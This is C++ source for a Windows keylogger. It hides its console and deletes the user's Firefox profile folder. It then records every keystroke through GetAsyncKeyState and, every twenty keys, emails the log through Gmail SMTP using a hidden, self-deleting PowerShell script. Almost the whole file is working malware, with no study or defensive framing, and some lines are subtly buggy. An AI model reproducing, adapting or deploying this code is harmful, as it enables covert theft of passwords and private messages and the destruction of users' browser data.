#include <iostream>
#include <cstring>
#include <stdlib.h>
#include <windows.h>
#include <fstream>
#include <Lmcons.h>
#include <WinUser.h>

using namespace std;

// global variables 
string content;

void clearFirefoxCache() {
    char path[256] = "C:\\Users\\";

    /* old method for pulling username
    strcat_s(path, std::getenv("LOGNAME"));
    strcat_s(path, "\\username\\"); */ 

    // using Windows32API header to pull username 
    CHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;

    /* checking that the username can be pulledand works
    if (GetUserNameA((CHAR*)username, &size)) {
        std::wcout << L"Hello, " << username << L"!\n";
        // std::cin.get();
    }
    else {
        std::cout << "Hello, unnamed person!\n";
        //std::cin.get();
    } */

    // function calling for username
    GetUserNameA((CHAR*)username, &size);

    // setting the username
    strcat_s(path, "\\");
    strcat_s(path, (username));
    strcat_s(path, "\\");

    // setting the end of the path
    strcat_s(path, "\\AppData\\Roaming\\Mozilla");

    // setting and running removal cmd command 
    char removepath[256] = "";
    strcat_s(removepath, "rmdir /Q /S ");
    strcat_s(removepath, path);
    system(removepath);

    // setting and running the folder creation cmd command 
    char createpath[256] = "";
    strcat_s(createpath, "mkdir ");
    strcat_s(createpath, path);
    system(createpath);

    // printing debug 
    // printf("Remove Path: %s \n Create Path: %s \n", removepath, createpath);
    // std::cin.get();
}
void clearChromeCache() {
    // setting the first string 
    char path[256] = "C:\\Users\\";

    // using Windows32API header to pull username 
    CHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;

    /* checking that the username can be pulledand works
    if (GetUserNameA((CHAR*)username, &size)) {
        std::wcout << L"Hello, " << username << L"!\n";
        // std::cin.get();
    }
    else {
        std::cout << "Hello, unnamed person!\n";
        //std::cin.get();
    } */

    // pulling the username
    GetUserNameA((CHAR*)username, &size);

    // setting the username
    strcat_s(path, "\\");
    strcat_s(path, (username));
    strcat_s(path, "\\");

    // setting the end of the path
    strcat_s(path, "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache");

    // setting and running removal cmd command 
    char removepath[256] = "";
    strcat_s(removepath, "rmdir /Q /S ");
    strcat_s(removepath, path);
    // system(removepath);

    // setting and running the folder creation cmd command 
    char createpath[256] = "";
    strcat_s(createpath, "mkdir ");
    strcat_s(createpath, path);
    // system(createpath);

    // printing debug 
    // printf("Remove Path: %s \n Create Path: %s \n", removepath, createpath);
    // std::cin.get();
}

void clearBrowserCache() {
    clearFirefoxCache();
    clearChromeCache();
}

void save(char key) {
    if (key == 8)
        content = content + "[BackSpace]";
    else if (key == 13)
        content = content + "\n";
    else if (key == 32)
        content = content + " ";
    else if (key == VK_TAB)
        content = content + "[TAB]";
    else if (key == VK_SHIFT)
        content = content + "[SHIFT]";
    else if (key == VK_CONTROL)
        content = content + "[CONTROL]";
    else if (key == VK_ESCAPE)
        content = content + "[ESCAPE]";
    else if (key == VK_END)
        content = content + "[END]";
    else if (key == VK_LEFT)
        content = content + "[LEFT]";
    else if (key == VK_RIGHT)
        content = content + "[RIGHT]";
    else if (key == VK_UP)
        content = content + "[UP]";
    else if (key == VK_DOWN)
        content = content + "[DOWN]";
    else if (key == VK_RBUTTON)
        content = content + "[RBUTTON]";
    else if (key == VK_LBUTTON)
        content = content + "[LBUTTON]";
    else { 
        char temp[2] = "";
        temp[0] = key;
        temp[1] = '\0';
        content = content + temp;
    }
}

void sendMail(string mail){
    ofstream myfile;
    myfile.open("Keylogger.ps1");
    myfile << "$Myemail=\"username@gmail.com\"\n";
    myfile << "$Mypass=\"password\"\n";
    myfile << "$SMTP=\"smtp.gmail.com\"\n";
    myfile << "$to=\"username@gmail.com\"\n";
    myfile << "$Subject=\"Keylogger\"\n";
    myfile << "$Body=\"Latest entries in the log = " << mail << "\"\n";
    myfile << "$SecurePassword=Convertto-SecureString -String $Mypass -AsPlainText -force\n";
    myfile << "$MyCredentials=New-object System.Management.Automation.PSCredential $Myemail,$SecurePassword\n";
    myfile << "Send-MailMessage -To $to -from $Myemail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $MyCredentials -UseSSL -Port 587 -DeliveryNotificationOption never";
    myfile.close();
    system("PowerShell.exe -windowstyle hidden .\\Keylogger.ps1");
    remove("Keylogger.ps1");
    content = "";
}

DWORD WINAPI ThreadFunc(void *data) {
    
    string mailcontent; 
    mailcontent = content; 
    sendMail(mailcontent);
    return 0;
}

int main()
{
    FreeConsole();
    clearBrowserCache();
    
    //variable initialisation 
    int counter = 0;
    
    while (1) 
    {
        for (char i = 8; i <= 190; i++) 
        {
            if (GetAsyncKeyState(i) == -32767) 
            {
                counter++;
                save(i);
                content += i;
                // cout << content << "\n";
                if (counter == 20) 
                {
                    /*
                    ofstream temp;
                    temp.open("TempLogger.dat");
                    temp << content; 
                    temp.close();
                    */

                    counter = 0; // reinstating counter 

                    HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
                } // end of counter if statement 
            } // end of if statement 
        } // end of for loop 
    } // end of while loop 
}
